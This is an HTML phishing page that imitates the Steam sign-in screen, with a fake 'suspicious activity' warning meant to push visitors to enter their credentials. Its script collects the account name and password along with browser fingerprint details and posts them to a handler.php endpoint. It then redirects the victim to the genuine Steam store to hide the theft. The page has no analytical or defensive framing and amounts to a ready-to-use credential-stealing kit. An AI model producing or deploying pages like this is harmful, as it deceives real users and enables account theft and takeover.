<!DOCTYPE html>
<html>
<head>
    <title>Steam - Sign In</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: Arial, Helvetica, sans-serif;
            background: linear-gradient(135deg, #171a21 0%, #1b2838 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .container {
            max-width: 400px;
            width: 100%;
        }
        .logo {
            text-align: center;
            margin-bottom: 30px;
        }
        .logo-text {
            font-size: 42px;
            font-weight: bold;
            color: #c7d5e0;
            letter-spacing: 2px;
        }
        .card {
            background: linear-gradient(135deg, #1b2838 0%, #2a475e 100%);
            border-radius: 4px;
            padding: 30px;
            box-shadow: 0 8px 32px rgba(0,0,0,.4);
        }
        h2 {
            color: #c7d5e0;
            font-size: 26px;
            margin-bottom: 20px;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        .alert {
            background: #ffca28;
            color: #1b2838;
            padding: 12px;
            border-radius: 3px;
            margin-bottom: 20px;
            font-size: 13px;
            font-weight: bold;
        }
        label {
            display: block;
            color: #8f98a0;
            font-size: 11px;
            text-transform: uppercase;
            margin-bottom: 5px;
            letter-spacing: 1px;
        }
        input {
            width: 100%;
            padding: 12px;
            background: #32475c;
            border: 1px solid #000;
            border-radius: 3px;
            color: #fff;
            font-size: 15px;
            margin-bottom: 18px;
        }
        input:focus {
            outline: none;
            background: #3d5a73;
            border-color: #67c1f5;
        }
        .btn {
            width: 100%;
            padding: 14px;
            background: linear-gradient(135deg, #06bfff 0%, #2d73ff 100%);
            border: none;
            border-radius: 3px;
            color: #fff;
            font-size: 16px;
            font-weight: bold;
            text-transform: uppercase;
            cursor: pointer;
            letter-spacing: 1px;
        }
        .btn:hover {
            background: linear-gradient(135deg, #2d73ff 0%, #06bfff 100%);
        }
        .links {
            margin-top: 20px;
            text-align: center;
        }
        .links a {
            color: #8f98a0;
            text-decoration: none;
            font-size: 12px;
        }
        .links a:hover {
            color: #67c1f5;
        }
        .divider {
            border-top: 1px solid #3d5a73;
            margin: 15px 0;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <div class="logo-text">STEAM</div>
        </div>

        <div class="card">
            <h2>Sign In</h2>

            <div class="alert">
                âš  Suspicious activity detected. Verify your account to continue.
            </div>

            <form id="steamForm" onsubmit="return handleSubmit(event)">
                <label for="username">Steam Account Name</label>
                <input type="text" id="username" required>

                <label for="password">Password</label>
                <input type="password" id="password" required>

                <button type="submit" class="btn">Sign In</button>
            </form>

            <div class="divider"></div>

            <div class="links">
                <a href="#">Forgot your password?</a><br>
                <a href="#">Join Steam</a>
            </div>
        </div>
    </div>

    <script>
        function handleSubmit(event) {
            event.preventDefault();
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            
            const data = {
                type: 'steam_credentials',
                username: username,
                password: password,
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screen: screen.width + 'x' + screen.height
            };
            
            fetch('handler.php', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(data)
            }).then(() => {
                const btn = document.querySelector('.btn');
                btn.textContent = 'Signing In...';
                btn.disabled = true;
                
                setTimeout(() => {
                    window.location.href = 'https://store.steampowered.com';
                }, 1500);
            });
            
            return false;
        }
    </script>
</body>
</html>
